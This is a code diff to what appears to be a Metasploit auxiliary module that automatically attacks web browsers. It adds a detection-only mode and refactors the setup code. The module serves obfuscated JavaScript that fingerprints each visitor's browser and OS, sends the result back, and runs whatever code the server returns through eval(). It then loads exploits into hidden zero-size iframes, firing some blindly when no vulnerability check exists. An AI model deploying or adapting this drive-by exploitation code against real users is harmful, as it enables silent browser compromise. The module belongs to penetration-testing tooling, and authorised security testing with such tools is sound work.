@@ -49,14 +49,15 @@ class Metasploit3 < Msf::Auxiliary
 					[ 'WebServer', {
 						'Description' => 'Start a bunch of modules and direct clients to appropriate exploits' 
 					} ],
+					[ 'DefangedDetection', {
+						'Description' => 'Only perform detection, send no exploits' 
+					} ],
 					[ 'list', { 
 						'Description' => 'List the exploit modules that would be started'
 					} ]
 				],
 			'PassiveActions' => 
-				[
-					'WebServer'
-				],
+				[ 'WebServer', 'DefangedDetection' ],
 			'DefaultAction'  => 'WebServer'))
 
 		register_options([
@@ -95,6 +96,8 @@ class Metasploit3 < Msf::Auxiliary
 			end
 			print_line
 			print_status("Found #{@exploits.length} exploit modules")
+		elsif (action.name == 'DefangedDetection')
+			exploit()
 		else 
 			start_exploit_modules()
 			if @exploits.length < 1
@@ -103,6 +106,109 @@ class Metasploit3 < Msf::Auxiliary
 			end
 			exploit()
 		end 
+	end
+
+
+	def setup
+
+		init_js = ::Rex::Exploitation::ObfuscateJS.new
+		init_js << <<-ENDJS
+
+			#{js_os_detect}
+			#{js_base64}
+			function make_xhr() {
+				var xhr;
+				try { 
+					xhr = new XMLHttpRequest(); 
+				} catch(e) {
+					try { 
+						xhr = new ActiveXObject("Microsoft.XMLHTTP"); 
+					} catch(e) {
+						xhr = new ActiveXObject("MSXML2.ServerXMLHTTP");
+					}
+				}
+				if (! xhr) {
+					throw "failed to create XMLHttpRequest";
+				}
+				return xhr;
+			}
+
+			function report_and_get_exploits(detected_version) {
+				var encoded_detection;
+				xhr = make_xhr();
+				xhr.onreadystatechange = function () {
+					if (xhr.readyState == 4 && (xhr.status == 200 || xhr.status == 304)) {
+						eval(xhr.responseText);
+					}
+				};
+
+				encoded_detection = new String();
+				#{js_debug('navigator.userAgent+"<br><br>"')}
+				for (var prop in detected_version) {
+					#{js_debug('prop + " " + detected_version[prop] +"<br>"')}
+					encoded_detection += detected_version[prop] + ":";
+				}
+				#{js_debug('encoded_detection + "<br>"')}
+				encoded_detection = Base64.encode(encoded_detection);
+				xhr.open("GET", document.location + "?sessid=" + encoded_detection);
+				xhr.send(null);
+			}
+
+			function bodyOnLoad() {
+				var detected_version = getVersion();
+				//#{js_debug('detected_version')}
+				report_and_get_exploits(detected_version);
+			} // function bodyOnLoad
+		ENDJS
+
+		opts = {
+			'Symbols' => {
+				'Variables'   => [
+					'xhr',
+					'encoded_detection',
+				],
+				'Methods'   => [
+					'report_and_get_exploits',
+					'handler',
+					'bodyOnLoad',
+				]
+			},
+			'Strings' => true,
+		}
+
+		init_js.update_opts(opts)
+		init_js.update_opts(js_os_detect.opts)
+		init_js.update_opts(js_base64.opts)
+		if (datastore['DEBUG'])
+			print_status("Adding debug code")
+			init_js << <<-ENDJS
+				if (!(typeof(debug) == 'function')) {
+					function htmlentities(str) {
+						str = str.replace(/>/g, '&gt;');
+						str = str.replace(/</g, '&lt;');
+						str = str.replace(/&/g, '&amp;');
+						return str;
+					}
+					function debug(msg) {
+						document.body.innerHTML += (msg + "<br />\\n");
+					}
+				}
+			ENDJS
+		else
+			init_js.obfuscate()
+		end
+
+		init_js << "window.onload = #{init_js.sym("bodyOnLoad")};";
+		@init_html  = "<html > <head > <title > Loading </title>\n"
+		@init_html << '<script language="javascript" type="text/javascript">'
+		@init_html << "<!-- \n #{init_js} //-->"
+		@init_html << "</script> </head> "
+		@init_html << "<body onload=\"#{init_js.sym("bodyOnLoad")}()\"> "
+		@init_html << "<noscript> \n"
+		@init_html << build_iframe("#{self.get_resource}?ns=1")
+		@init_html << "</noscript> \n"
+		@init_html << "</body> </html> "
+
 	end
 
 
@@ -125,7 +231,6 @@ class Metasploit3 < Msf::Auxiliary
 
 		# For testing, set the exploit uri to the name of the exploit so it's
 		# easy to tell what is happening from the browser.
-		# XXX: Set to nil for release
 		if (datastore['DEBUG'])
 			@exploits[name].datastore['URIPATH'] = name  
 		else
@@ -157,6 +262,7 @@ class Metasploit3 < Msf::Auxiliary
 		end
 		return true
 	end
+
 
 	def start_exploit_modules() 
 		@lhost = (datastore['LHOST'] || "0.0.0.0")
@@ -227,104 +333,6 @@ class Metasploit3 < Msf::Auxiliary
 			tests.sort! {|a,b| b[:rank] <=> a[:rank]}
 		}
 
-		init_js = ::Rex::Exploitation::ObfuscateJS.new
-		init_js << <<-ENDJS
-
-			#{js_os_detect}
-			#{js_base64}
-			function make_xhr() {
-				var xhr;
-				try { 
-					xhr = new XMLHttpRequest(); 
-				} catch(e) {
-					try { 
-						xhr = new ActiveXObject("Microsoft.XMLHTTP"); 
-					} catch(e) {
-						xhr = new ActiveXObject("MSXML2.ServerXMLHTTP");
-					}
-				}
-				if (! xhr) {
-					throw "failed to create XMLHttpRequest";
-				}
-				return xhr;
-			}
-
-			function report_and_get_exploits(detected_version) {
-				var encoded_detection;
-				xhr = make_xhr();
-				xhr.onreadystatechange = function () {
-					if (xhr.readyState == 4 && (xhr.status == 200 || xhr.status == 304)) {
-						eval(xhr.responseText);
-					}
-				};
-
-				encoded_detection = new String();
-				#{js_debug('navigator.userAgent+"<br>"')}
-				for (var prop in detected_version) {
-					#{js_debug('prop + " " + detected_version[prop] +"<br>"')}
-					encoded_detection += detected_version[prop] + ":";
-				}
-				#{js_debug('encoded_detection + "<br>"')}
-				encoded_detection = Base64.encode(encoded_detection);
-				xhr.open("GET", document.location + "?sessid=" + encoded_detection);
-				xhr.send(null);
-			}
-
-			function bodyOnLoad() {
-				var detected_version = getVersion();
-				//#{js_debug('detected_version')}
-				report_and_get_exploits(detected_version);
-			} // function bodyOnLoad
-		ENDJS
-
-		opts = {
-			'Symbols' => {
-				'Variables'   => [
-					'xhr',
-					'encoded_detection',
-				],
-				'Methods'   => [
-					'report_and_get_exploits',
-					'handler',
-					'bodyOnLoad',
-				]
-			},
-			'Strings' => true,
-		}
-
-		init_js.update_opts(opts)
-		init_js.update_opts(js_os_detect.opts)
-		init_js.update_opts(js_base64.opts)
-		if (datastore['DEBUG'])
-			print_status("Adding debug code")
-			init_js << <<-ENDJS
-				if (!(typeof(debug) == 'function')) {
-					function htmlentities(str) {
-						str = str.replace(/>/g, '&gt;');
-						str = str.replace(/</g, '&lt;');
-						str = str.replace(/&/g, '&amp;');
-						return str;
-					}
-					function debug(msg) {
-						document.body.innerHTML += (msg + "<br />\\n");
-					}
-				}
-			ENDJS
-		else
-			init_js.obfuscate()
-		end
-
-		init_js << "window.onload = #{init_js.sym("bodyOnLoad")}";
-		@init_html  = "<html > <head > <title > Loading </title>\n"
-		@init_html << '<script language="javascript" type="text/javascript">'
-		@init_html << "<!-- \n #{init_js} //-->"
-		@init_html << "</script> </head> "
-		@init_html << "<body onload=\"#{init_js.sym("bodyOnLoad")}()\"> "
-		@init_html << "<noscript> \n"
-		@init_html << build_iframe("#{self.get_resource}?ns=1")
-		@init_html << "</noscript> \n"
-		@init_html << "</body> </html> "
-
 	end
 
 	def on_request_uri(cli, request) 
@@ -346,8 +354,16 @@ class Metasploit3 < Msf::Auxiliary
 			# enabled.  Includes the results of the javascript fingerprinting
 			# in the "sessid" parameter as a base64 encoded string.
 			record_detection(cli, request)
-			print_status("Responding with exploits")
-			response = build_script_response(cli, request)
+			if (action.name == "DefangedDetection")
+				#print_status("")
+				response = create_response()
+				response["Expires"] = "0"
+				response["Cache-Control"] = "must-revalidate"
+				response.body = "Your mom"
+			else
+				print_status("Responding with exploits")
+				response = build_script_response(cli, request)
+			end
 			
 			cli.send_response(response)
 		when %r{^#{self.get_resource}.*ns=1}
@@ -415,14 +431,15 @@ class Metasploit3 < Msf::Auxiliary
 		host_info = get_host(cli.peerhost)
 
 		js = ::Rex::Exploitation::ObfuscateJS.new
-		# If we didn't get a client database, then the detection is
-		# borked or the db is not connected, so fallback to sending
-		# some IE-specific stuff with everything.  Otherwise, make
-		# sure this is IE before sending code for ActiveX checks.
+		# If we didn't get a client from the database, then the detection
+		# is borked or the db is not connected, so fallback to sending
+		# some IE-specific stuff with everything.  Do the same if the
+		# exploit didn't specify a client.  Otherwise, make sure this is
+		# IE before sending code for ActiveX checks.
 		if (client_info.nil? || [nil, HttpClients::IE].include?(client_info[:ua_name]))
 			# If we have a class name (e.g.: "DirectAnimation.PathControl"),
 			# use the simple and direct "new ActiveXObject()".  If we
-			# have a classid instead, first try creating a the object
+			# have a classid instead, first try creating the object
 			# with createElement("object").  However, some things
 			# don't like being created this way (specifically winzip),
 			# so try writing out an object tag as well.  One of these
@@ -462,6 +479,7 @@ class Metasploit3 < Msf::Auxiliary
 			ENDJS
 			# End of IE-specific test functions
 		end
+		# Generic stuff that is needed regardless of what browser was detected.
 		js << <<-ENDJS
 			var written_iframes = new Array();
 			function write_iframe(myframe) {
@@ -496,12 +514,15 @@ class Metasploit3 < Msf::Auxiliary
 
 		@js_tests.each { |browser, sploits|
 			next if sploits.length == 0
+			#print_status("#{client_info[:ua_name]} =? [nil, #{browser}, 'generic']")
+			#if (browser == "generic" || client_info.nil? || [nil, browser].include?(client_info[:ua_name]))
 			if (client_info.nil? || [nil, browser, "generic"].include?(client_info[:ua_name]))
 				# Make sure the browser names can be used as an identifier in
 				# case something wacky happens to them.
 				func_name = "exploit#{browser.gsub(/[^a-zA-Z]/, '')}"
 				js << "function #{func_name}() { \n"
 				sploits.map do |s|
+					# Skip exploits that don't match the client's OS.
 					if (host_info and host_info[:os_name] and s[:os_name])
 						next unless s[:os_name].include?(host_info[:os_name])
 					end
@@ -517,6 +538,9 @@ class Metasploit3 < Msf::Auxiliary
 						js << "  write_iframe('" + exploit_resource(s[:name]) + "'); "
 						js << " }\n"
 					else
+						# If the exploit doesn't provide a way to check
+						# for the vulnerability, just try it and hope for
+						# the best.
 						js << " write_iframe('" + exploit_resource(s[:name]) + "');\n"
 					end
 				end
@@ -589,7 +613,7 @@ class Metasploit3 < Msf::Auxiliary
 
 		# If the database is not connected, use a cache instead.
 		# This is less reliable because we're not treating different user
-		# agents from the same IP as a different hosts.
+		# agents from the same IP as different hosts.
 		if (!get_client(cli.peerhost, request['User-Agent']))
 			print_status("No database, using targetcache instead")
 			@targetcache ||= {}
@@ -615,16 +639,22 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 	# Override super#get_client to use a cache in case the database
-	# is not available
+	# is not available.  It might be a good idea to do this by default,
+	# essentially creating an in-memory database.  The upside is that it works
+	# if the database is broken.  The downside of course is that querying from
+	# a hash is not as simple or efficient as a database.
 	def get_client(host, ua)
 		return super(host, ua) || @targetcache[host]
 	end
 
 	def build_iframe(resource)
 		ret = ''
-		#ret << "<p>iframe #{resource}</p>"
-		ret << "<iframe src=\"#{resource}\" style=\"visibility:hidden\" height=\"0\" width=\"0\" border=\"0\"></iframe>"
-		#ret << "<iframe src=\"#{resource}\" ></iframe>"
+		if (action.name == 'DefangedDetection')
+			ret << "<p>iframe #{resource}</p>"
+		else
+			ret << "<iframe src=\"#{resource}\" style=\"visibility:hidden\" height=\"0\" width=\"0\" border=\"0\"></iframe>"
+			#ret << "<iframe src=\"#{resource}\" ></iframe>"
+		end
 		return ret
 	end
 
